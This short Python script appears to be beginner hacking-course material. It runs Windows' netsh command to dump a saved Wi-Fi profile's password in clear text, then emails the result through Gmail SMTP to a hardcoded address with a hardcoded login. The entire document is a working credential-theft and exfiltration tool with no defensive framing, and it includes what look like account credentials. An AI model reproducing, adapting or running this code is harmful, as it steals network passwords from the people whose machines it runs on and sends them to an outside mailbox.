#!/usr/bin/env python
#FOR THIS YOU HAVE TO ALLOW LESS SECURE APPS : ON TO YOUR GMAIL ACCOUNT

import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)  #First_Argument is From and Second_argument is To and third one is content
    server.quit()


command = "netsh wlan show profile UPC723762 key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("hackerdj@gmail.com", "abc123abc", result)